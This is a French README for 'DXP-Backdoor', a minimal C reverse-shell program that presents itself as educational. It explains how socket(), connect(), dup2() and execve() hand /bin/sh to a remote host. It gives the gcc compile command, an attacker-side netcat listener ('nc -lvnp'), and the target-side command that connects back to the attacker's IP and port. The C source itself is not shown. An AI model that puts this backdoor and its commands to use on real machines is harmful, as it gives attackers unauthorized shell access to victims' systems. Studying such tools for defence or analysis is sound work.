# DXP-Backdoor - Reverse Shell (C Système)

📄 Description Factuelle

Ce projet est un programme minimaliste en C Système visant à établir un Reverse Shell TCP/IP. Son objectif est de démontrer l'utilisation des appels système Unix de bas niveau pour obtenir un accès shell distant sur une machine cible (Linux/UNIX).

Il est conçu strictement à des fins éducatives et d'analyse binaire.

⚙️ Fonctionnalités Techniques Clés

Le programme utilise une séquence d'appels système critiques :
Fonction C	Rôle Bas Niveau
socket()	Création du descripteur de fichier (File Descriptor, FD) pour la connexion réseau (AF_INET, SOCK_STREAM).
connect()	Tentative d'établissement de la liaison TCP vers l'adresse et le port de l'attaquant.
dup2()	Détournement des trois flux d'E/S standard : STDIN (0), STDOUT (1), STDERR (2) sont tous redirigés vers le descripteur du socket.
execve()	Remplacement du processus actuel par un shell (/bin/sh) sans créer de nouveau processus, assurant la prise de contrôle.

🔨 Compilation

Pour compiler le binaire sur une plateforme Linux/x86-64 :
Bash

L'option -g est ajoutée pour inclure les symboles de débogage (GDB)
L'option -w supprime les avertissements de compilation (Warning)

gcc reverse_shell.c -o rev -g -w

🚀 Utilisation (Démonstration)

Ce binaire nécessite deux arguments : l'adresse IP de la machine d'écoute et le port.

1. Machine Attaquante (Écoute)

Utilisez netcat (nc) pour ouvrir un port en mode écoute :
Bash

nc -lvnp [PORT_D_ÉCOUTE]

2. Machine Cible (Exécution du binaire)

Exécutez le programme en lui fournissant l'IP et le port de la machine attaquante :
Bash

./rev [IP_ATTAQUANTE] [PORT_D_ÉCOUTE]

Une fois le binaire exécuté, un shell /bin/sh sera immédiatement disponible sur la machine attaquante via netcat.
